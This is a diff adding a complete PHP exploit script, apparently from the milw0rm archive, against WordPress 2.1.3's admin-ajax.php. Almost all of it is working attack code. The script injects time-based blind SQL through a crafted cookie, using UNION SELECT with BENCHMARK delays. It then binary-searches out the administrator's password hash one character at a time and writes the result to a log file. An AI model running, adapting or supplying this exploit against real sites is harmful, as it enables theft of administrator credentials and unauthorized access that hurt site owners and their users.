@@ -1,0 +1,288 @@
+<?php
+error_reporting(E_ALL);
+$norm_delay = 0;
+///////////////////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////////////////
+// WordPress 2.1.3 "admin-ajax.php" sql injection blind fishing exploit
+// written by Janek Vind "waraxe"
+// http://www.waraxe.us/
+// 21. may 2007
+///////////////////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////////////////
+//=====================================================================
+$outfile = './warlog.txt';// Log file
+$url = 'http://localhost/wordpress.2.1.3/wp-admin/admin-ajax.php';
+$testcnt = 300000;// Use bigger numbers, if server is slow, default is 300000
+$id = 1;// ID of the target user, default value "1" is admin's ID
+$suffix = '';// Override value, if needed
+$prefix = 'wp_';// WordPress table prefix, default is "wp_"
+//======================================================================
+
+echo "Target: $url\n";
+echo "sql table prefix: $prefix\n";
+
+if(empty($suffix))
+{
+	$suffix = md5(substr($url, 0, strlen($url) - 24));
+}
+
+echo "cookie suffix: $suffix\n";
+
+echo "testing probe delays \n";
+
+$norm_delay = get_normdelay($testcnt);
+echo "normal delay: $norm_delay deciseconds\n";
+
+$hash = get_hash();
+
+add_line("Target: $url");
+add_line("User ID: $id");
+add_line("Hash: $hash");
+
+echo "\nWork finished\n";
+echo "Questions and feedback - http://www.waraxe.us/ \n";
+die("See ya! :) \n");
+///////////////////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////////////////
+function get_hash()
+{
+	$len = 32;
+	$field = 'user_pass';
+	$out = '';
+	
+	echo "finding hash now ...\n";
+	
+	for($i = 1; $i < $len + 1; $i ++)
+	{
+		$ch = get_hashchar($field,$i);
+		echo "got $field pos $i --> $ch\n";
+		$out .= "$ch";
+		echo "current value for $field: $out \n";
+	}
+	
+	echo "\nFinal result: $field=$out\n\n";
+	
+	return $out;
+}
+///////////////////////////////////////////////////////////////////////
+function get_hashchar($field,$pos)
+{
+	global $prefix, $suffix, $id, $testcnt;
+	$char = '';
+	$cnt = $testcnt * 4;
+	$ppattern = 'cookie=wordpressuser_%s%%3dxyz%%2527%s; wordpresspass_%s%%3dp0hh';
+	$ipattern = " UNION ALL SELECT 1,2,user_pass,4,5,6,7,8,9,10 FROM %susers WHERE ID=%d AND IF(ORD(SUBSTRING($field,$pos,1))%s,BENCHMARK($cnt,MD5(1337)),3)/*";
+
+	// First let's determine, if it's number or letter
+	$inj = sprintf($ipattern, $prefix, $id, ">57");
+	$post = sprintf($ppattern, $suffix, $inj, $suffix);
+	$letter = test_condition($post);
+	
+	if($letter)
+	{
+		$min = 97;
+		$max = 102;
+		echo "char to find is [a-f]\n";
+	}
+	else
+	{
+		$min = 48;
+		$max = 57;
+		echo "char to find is [0-9]\n";
+	}
+
+	$curr = 0;
+	
+	while(1)
+	{
+		$area = $max - $min;
+		if($area < 2 )
+		{
+			$inj = sprintf($ipattern, $prefix, $id, "=$max");
+			$post = sprintf($ppattern, $suffix, $inj, $suffix);
+			$eq = test_condition($post);
+			
+			if($eq)
+			{
+				$char = chr($max);
+			}
+			else
+			{
+				$char = chr($min);
+			}
+			
+			break;
+		}
+		
+		$half = intval(floor($area / 2));
+		$curr = $min + $half;
+		
+		$inj = sprintf($ipattern, $prefix, $id, ">$curr");
+		$post = sprintf($ppattern, $suffix, $inj, $suffix);
+		
+		$bigger = test_condition($post);
+		
+		if($bigger)
+		{
+			$min = $curr;
+		}
+		else
+		{
+			$max = $curr;
+		}
+
+		echo "curr: $curr--$max--$min\n";
+	}
+	
+	return $char;
+}
+///////////////////////////////////////////////////////////////////////
+function test_condition($p)
+{
+	global $url, $norm_delay;
+	$bret = false;
+	$maxtry = 10;
+	$try = 1;
+	
+	while(1)
+	{
+		$start = getmicrotime();
+		$buff = make_post($url, $p);
+		$end = getmicrotime();
+	
+		if($buff === '-1')
+		{
+			break;
+		}
+		else
+		{
+			echo "test_condition() - try $try - invalid return value ...\n";
+			$try ++;
+			if($try > $maxtry)
+			{
+				die("too many tries - exiting ...\n");
+			}
+			else
+			{
+				echo "trying again - try $try ...\n";
+			}
+		}
+	}
+	
+	$diff = $end - $start;
+	$delay = intval($diff * 10);
+	
+	if($delay > ($norm_delay * 2))
+	{
+		$bret = true;
+	}
+	
+	return $bret;
+}
+///////////////////////////////////////////////////////////////////////
+function get_normdelay($testcnt)
+{
+	$fa = test_md5delay(1);
+	echo "$fa\n";
+	$sa = test_md5delay($testcnt);
+	echo "$sa\n";
+	$fb = test_md5delay(1);
+	echo "$fb\n";
+	$sb = test_md5delay($testcnt);
+	echo "$sb\n";
+	$fc = test_md5delay(1);
+	echo "$fc\n";
+	$sc = test_md5delay($testcnt);
+	echo "$sc\n";
+	
+	$mean_nondelayed = intval(($fa + $fb + $fc) / 3);
+	echo "mean nondelayed - $mean_nondelayed dsecs\n";
+	$mean_delayed = intval(($sa + $sb + $sc) / 3);
+	echo "mean delayed - $mean_delayed dsecs\n";
+	
+	return $mean_delayed;
+}
+///////////////////////////////////////////////////////////////////////
+function test_md5delay($cnt)
+{
+	global $url, $id, $prefix, $suffix;
+	
+	// delay in deciseconds
+	$delay = -1;
+	$ppattern = 'cookie=wordpressuser_%s%%3dxyz%%2527%s; wordpresspass_%s%%3dp0hh';
+	$ipattern = ' UNION ALL SELECT 1,2,user_pass,4,5,6,7,8,9,10 FROM %susers WHERE ID=%d AND IF(LENGTH(user_pass)>31,BENCHMARK(%d,MD5(1337)),3)/*';
+	$inj = sprintf($ipattern, $prefix, $id, $cnt);
+	$post = sprintf($ppattern, $suffix, $inj, $suffix); 
+
+	$start = getmicrotime();
+	$buff = make_post($url, $post);
+	$end = getmicrotime();
+	
+	if(intval($buff) !== -1)
+	{
+		die("test_md5delay($cnt) - invalid return value, exiting ...");
+	}
+
+	$diff = $end - $start;
+	$delay = intval($diff * 10);
+
+	return $delay;
+}
+///////////////////////////////////////////////////////////////////////
+function getmicrotime() 
+{ 
+    list($usec, $sec) = explode(" ", microtime()); 
+    return ((float)$usec + (float)$sec); 
+} 
+///////////////////////////////////////////////////////////////////////
+function make_post($url, $post_fields='', $cookie = '', $referer = '', $headers = FALSE)
+{
+	$ch = curl_init();
+	$timeout = 120;
+	curl_setopt ($ch, CURLOPT_URL, $url);
+	curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
+	curl_setopt($ch, CURLOPT_POST, 1); 
+	curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); 
+	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+	curl_setopt ($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)');
+	
+	if(!empty($cookie))
+	{
+		curl_setopt ($ch, CURLOPT_COOKIE, $cookie);
+	}
+ 
+	if(!empty($referer))
+	{
+		curl_setopt ($ch, CURLOPT_REFERER, $referer);
+	}
+
+	if($headers === TRUE)
+	{
+		curl_setopt ($ch, CURLOPT_HEADER, TRUE);
+	}
+	else
+	{
+		curl_setopt ($ch, CURLOPT_HEADER, FALSE);
+	}
+
+	$fc = curl_exec($ch);
+	curl_close($ch);
+	
+	return $fc;
+}
+///////////////////////////////////////////////////////////////////////
+function add_line($buf)
+{
+	global $outfile;
+	
+	$buf .= "\n";
+	$fh = fopen($outfile, 'ab');
+	fwrite($fh, $buf);
+	fclose($fh);
+	
+}
+///////////////////////////////////////////////////////////////////////
+?>
+
+# milw0rm.com [2007-05-21]
